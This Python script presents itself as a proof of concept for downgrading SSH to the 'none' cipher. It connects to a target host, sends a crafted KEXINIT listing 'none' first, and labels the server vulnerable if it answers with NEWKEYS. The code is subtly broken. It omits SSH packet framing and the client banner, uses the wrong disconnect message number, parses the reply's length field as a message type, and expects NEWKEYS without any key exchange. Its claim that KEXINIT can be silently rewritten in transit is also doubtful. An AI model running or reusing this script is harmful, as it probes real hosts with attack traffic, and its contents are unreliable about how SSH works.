#!/usr/bin/env python3
"""
Proof-of-Concept: SSH Cipher Downgrade via 'none' Algorithm Injection

This script demonstrates how an on-path attacker can modify the SSH_MSG_KEXINIT
packet to inject the 'none' encryption algorithm at a higher priority.
According to RFC 4253 Section 7.1, if 'none' is explicitly listed and accepted,
the connection proceeds without encryption.
"""
import socket
import struct
import sys
import os

def encode_name_list(algorithms: list) -> bytes:
    """
    Encodes a list of algorithm names into the SSH name-list format.
    Format: [4-byte length][algorithm1_len][algorithm1][,][algorithm2_len]...
    """
    combined = ",".join(algorithms)
    return struct.pack('>I', len(combined)) + combined.encode('ascii')

def build_kexinit_packet(inject_none: bool = False) -> bytes:
    """
    Constructs a malicious SSH_MSG_KEXINIT packet.
    If inject_none is True, it forces 'none' to be the first encryption algorithm.
    """
    # 1. Message Type (SSH_MSG_KEXINIT = 20)
    msg_type = struct.pack('B', 20)

    # 2. Cookie (16 random bytes)
    cookie = os.urandom(16)

    # 3. Algorithm Lists
    kex_algs = ["diffie-hellman-group-exchange-sha256", "diffie-hellman-group14-sha256"]
    host_key_algs = ["ssh-rsa", "ecdsa-sha2-nistp256"]
    
    # Standard ciphers
    standard_ciphers = ["aes256-ctr", "aes192-ctr", "aes128-ctr"]
    if inject_none:
        # VULNERABILITY INJECTION: Prepend 'none' to force it as the preferred cipher
        client_to_server_ciphers = ["none"] + standard_ciphers
        server_to_client_ciphers = ["none"] + standard_ciphers
    else:
        client_to_server_ciphers = standard_ciphers
        server_to_client_ciphers = standard_ciphers

    mac_algs = ["hmac-sha2-256", "hmac-sha1"]
    comp_algs = ["none", "zlib@openssh.com"]
    lang_algs = []

    # Encode name-lists
    kex_list = encode_name_list(kex_algs)
    host_key_list = encode_name_list(host_key_algs)
    enc_client_list = encode_name_list(client_to_server_ciphers)
    enc_server_list = encode_name_list(server_to_client_ciphers)
    mac_client_list = encode_name_list(mac_algs)
    mac_server_list = encode_name_list(mac_algs) # Symmetric for demo
    comp_client_list = encode_name_list(comp_algs)
    comp_server_list = encode_name_list(comp_algs)
    lang_client_list = encode_name_list(lang_algs)
    lang_server_list = encode_name_list(lang_algs)

    # 4. first_kex_packet_follows (boolean) and reserved uint32
    first_kex = struct.pack('B', 0) + struct.pack('>I', 0)

    # Assemble packet
    kexinit = msg_type + cookie + \
              kex_list + host_key_list + \
              enc_client_list + enc_server_list + \
              mac_client_list + mac_server_list + \
              comp_client_list + comp_server_list + \
              lang_client_list + lang_server_list + \
              first_kex
    return kexinit

def send_malicious_kexinit(target_ip, target_port):
    """
    Connects to the SSH server and sends a crafted KEXINIT packet with 'none' injected.
    In a real MITM scenario, this would be done by intercepting and modifying the legitimate client's packet.
    Here we simulate the attacker's payload directly.
    """
    print(f"[*] Connecting to {target_ip}:{target_port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))

    # Read SSH banner (e.g., SSH-2.0-OpenSSH_8.x)
    banner = b""
    while not banner.endswith(b'\r\n'):
        chunk = sock.recv(1024)
        if not chunk: break
        banner += chunk
    print(f"[+] Received Banner: {banner.decode('utf-8', errors='ignore').strip()}")

    # Craft the malicious KEXINIT
    print("[*] Crafting SSH_MSG_KEXINIT with 'none' cipher injected at highest priority...")
    malicious_kexinit = build_kexinit_packet(inject_none=True)

    # Send the packet
    sock.sendall(malicious_kexinit)
    print(f"[+] Sent {len(malicious_kexinit)} bytes of malicious KEXINIT.")

    # Wait for server response (SSH_MSG_NEWKEYS or error/disconnect)
    print("[*] Waiting for server response...")
    try:
        sock.settimeout(5.0)
        while True:
            data = sock.recv(4096)
            if not data: break
            # Check for SSH_MSG_NEWKEYS (21) or SSH_MSG_DISCONNECT (SSH_MSG_KEXINIT is 20, NEWKEYS is 21)
            msg_type = struct.unpack('B', data[0:1])[0]
            print(f"[*] Received message type: {msg_type}")
            if msg_type == 21:
                print("[!] SUCCESS: Server accepted 'none' cipher and sent NEWKEYS.")
                print("    The connection is now UNENCRYPTED. All subsequent traffic (including auth) is plaintext.")
                return True
            elif msg_type == 0x0F: # SSH_MSG_DISCONNECT
                reason = struct.unpack('>I', data[5:9])[0]
                print(f"[-] FAILURE: Server disconnected with reason {reason}.")
                return False
    except socket.timeout:
        print("[-] TIMEOUT: No response from server within 5 seconds.")
        return False
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    result = send_malicious_kexinit(target_ip, target_port)
    if result:
        print("\n[VULNERABLE] The server allowed the 'none' cipher downgrade.")
    else:
        print("\n[PATCHED/SAFE] The server rejected the 'none' cipher or disconnected.")